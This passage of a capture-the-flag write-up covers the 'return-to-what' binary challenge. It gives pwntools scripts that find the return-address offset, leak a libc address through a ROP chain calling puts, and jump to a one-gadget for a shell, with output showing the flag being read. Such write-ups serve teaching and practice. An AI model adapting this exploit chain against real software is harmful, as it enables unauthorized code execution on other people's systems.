&lt;p>Now that we&amp;rsquo;ve found everything we need, we can do a little more information gathering to get the last thing we need for our exploit - the offset of the return address from our input buffer.&lt;/p>
&lt;p>Here&amp;rsquo;s a quick script that&amp;rsquo;ll attach the process to GDB before sending a large cyclic pattern of bytes to it, allowing us to find the offset of the return address.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-py" data-lang="py">&lt;span style="color:#75715e">#!/usr/bin/env python3&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> pwn &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
r &lt;span style="color:#f92672">=&lt;/span> process(&lt;span style="color:#e6db74">&amp;#39;./return-to-what&amp;#39;&lt;/span>)
gdb&lt;span style="color:#f92672">.&lt;/span>attach(r)
r&lt;span style="color:#f92672">.&lt;/span>clean()
r&lt;span style="color:#f92672">.&lt;/span>writeline(cyclic(&lt;span style="color:#ae81ff">100&lt;/span>, n&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">8&lt;/span>))
r&lt;span style="color:#f92672">.&lt;/span>interactive()
&lt;/code>&lt;/pre>&lt;/div>&lt;p>After continuing in GDB and letting the program crash, we can see what was stored in the return address.&lt;/p>
&lt;pre>&lt;code> ► 0x4011ac &amp;lt;vuln+39&amp;gt; ret &amp;lt;0x6161616161616168&amp;gt;
&lt;/code>&lt;/pre>&lt;p>Using pwntools' &lt;code>cyclic_find&lt;/code> function, we can use the value we found above to calculate the offset of the return address from our input buffer.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-py" data-lang="py">In [&lt;span style="color:#ae81ff">2&lt;/span>]: cyclic_find(&lt;span style="color:#ae81ff">0x6161616161616168&lt;/span>, n&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">8&lt;/span>)
Out[&lt;span style="color:#ae81ff">2&lt;/span>]: &lt;span style="color:#ae81ff">56&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="exploit-development">Exploit Development&lt;/h2>
&lt;p>Now that we have everything we need, we can begin to write our exploit. There&amp;rsquo;s quite a few things that we need to achieve, here&amp;rsquo;s a list:&lt;/p>
&lt;ul>
&lt;li>Overwrite the return address to get control of process execution.&lt;/li>
&lt;li>Use &lt;code>puts&lt;/code> to print the value of &lt;code>puts&lt;/code> stored in the global offset table (a &lt;code>libc&lt;/code> address).&lt;/li>
&lt;li>Capture the leaked &lt;code>libc&lt;/code> address, and subtract the offset of the &lt;code>puts&lt;/code> address to get the start address of &lt;code>libc&lt;/code>.&lt;/li>
&lt;li>Use the leaked &lt;code>libc&lt;/code> address to redirect process execution to our &amp;lsquo;magic&amp;rsquo; gadget to get a shell.&lt;/li>
&lt;/ul>
&lt;p>Keep in mind that we need to setup carefully for the &amp;lsquo;magic&amp;rsquo; gadget, as it&amp;rsquo;ll only execute under specific circumstances.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-py" data-lang="py">&lt;span style="color:#75715e">#!/usr/bin/env python3&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> pwn &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
context&lt;span style="color:#f92672">.&lt;/span>clear(arch&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;amd64&amp;#39;&lt;/span>)
pad &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;A&amp;#39;&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">56&lt;/span>
&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;
&lt;/span>&lt;span style="color:#e6db74">0x000000000040122b: pop rdi; ret;
&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;&lt;/span>
pop_rdi &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x040122b&lt;/span>
&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;
&lt;/span>&lt;span style="color:#e6db74">0x0000000000401224: pop r12; pop r13; pop r14; pop r15; ret;
&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;&lt;/span>
setup &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x0401224&lt;/span>
r &lt;span style="color:#f92672">=&lt;/span> process(&lt;span style="color:#e6db74">&amp;#39;./return-to-what&amp;#39;&lt;/span>)
elf &lt;span style="color:#f92672">=&lt;/span> ELF(&lt;span style="color:#e6db74">&amp;#39;./return-to-what&amp;#39;&lt;/span>)
rop &lt;span style="color:#f92672">=&lt;/span> ROP(elf)
&lt;span style="color:#75715e"># pop rdi; ret&lt;/span>
rop&lt;span style="color:#f92672">.&lt;/span>raw(pop_rdi)
rop&lt;span style="color:#f92672">.&lt;/span>raw(elf&lt;span style="color:#f92672">.&lt;/span>got[&lt;span style="color:#e6db74">&amp;#39;puts&amp;#39;&lt;/span>]) &lt;span style="color:#75715e"># pop rdi&lt;/span>
&lt;span style="color:#75715e"># puts&lt;/span>
rop&lt;span style="color:#f92672">.&lt;/span>raw(elf&lt;span style="color:#f92672">.&lt;/span>plt[&lt;span style="color:#e6db74">&amp;#39;puts&amp;#39;&lt;/span>]) &lt;span style="color:#75715e"># puts(puts)&lt;/span>
&lt;span style="color:#75715e"># main&lt;/span>
rop&lt;span style="color:#f92672">.&lt;/span>raw(elf&lt;span style="color:#f92672">.&lt;/span>sym[&lt;span style="color:#e6db74">&amp;#39;main&amp;#39;&lt;/span>])
r&lt;span style="color:#f92672">.&lt;/span>clean()
r&lt;span style="color:#f92672">.&lt;/span>writeline(pad &lt;span style="color:#f92672">+&lt;/span> rop&lt;span style="color:#f92672">.&lt;/span>chain())
leak &lt;span style="color:#f92672">=&lt;/span> r&lt;span style="color:#f92672">.&lt;/span>readline()[:&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>]
leak &lt;span style="color:#f92672">=&lt;/span> unpack(leak, len(leak) &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>)
libc &lt;span style="color:#f92672">=&lt;/span> leak &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">0x765f0&lt;/span>
magic &lt;span style="color:#f92672">=&lt;/span> libc &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0xcbd1a&lt;/span>
rop &lt;span style="color:#f92672">=&lt;/span> ROP(elf)
&lt;span style="color:#75715e"># setup &lt;/span>
rop&lt;span style="color:#f92672">.&lt;/span>raw(setup)
rop&lt;span style="color:#f92672">.&lt;/span>raw(&lt;span style="color:#ae81ff">0&lt;/span>) &lt;span style="color:#75715e"># pop r12&lt;/span>
rop&lt;span style="color:#f92672">.&lt;/span>raw(&lt;span style="color:#ae81ff">0&lt;/span>) &lt;span style="color:#75715e"># pop r13&lt;/span>
rop&lt;span style="color:#f92672">.&lt;/span>raw(&lt;span style="color:#ae81ff">0&lt;/span>) &lt;span style="color:#75715e"># pop r14&lt;/span>
rop&lt;span style="color:#f92672">.&lt;/span>raw(&lt;span style="color:#ae81ff">0&lt;/span>) &lt;span style="color:#75715e"># pop r15&lt;/span>
&lt;span style="color:#75715e"># magic gadget&lt;/span>
rop&lt;span style="color:#f92672">.&lt;/span>raw(magic)
r&lt;span style="color:#f92672">.&lt;/span>writeline(pad &lt;span style="color:#f92672">+&lt;/span> rop&lt;span style="color:#f92672">.&lt;/span>chain())
r&lt;span style="color:#f92672">.&lt;/span>clean()
r&lt;span style="color:#f92672">.&lt;/span>interactive()
&lt;/code>&lt;/pre>&lt;/div>&lt;p>And finally, here&amp;rsquo;s our exploit in action. It gives us an interactive shell that we can use to read the flag.&lt;/p>
&lt;pre>&lt;code>$ ./exploit.py
[+] Starting local process './return-to-what': pid 2145
[*] './return-to-what'
Arch: amd64-64-little
RELRO: Partial RELRO
Stack: No canary found
NX: NX enabled
PIE: No PIE (0x400000)
[*] Loaded 14 cached gadgets for './return-to-what'
[*] Switching to interactive mode
$ cat flag.txt
DUCTF{ret_pUts_ret_main_ret_where???}
$
[*] Stopped process './return-to-what' (pid 2145)
&lt;/code>&lt;/pre></content></item></channel></rss>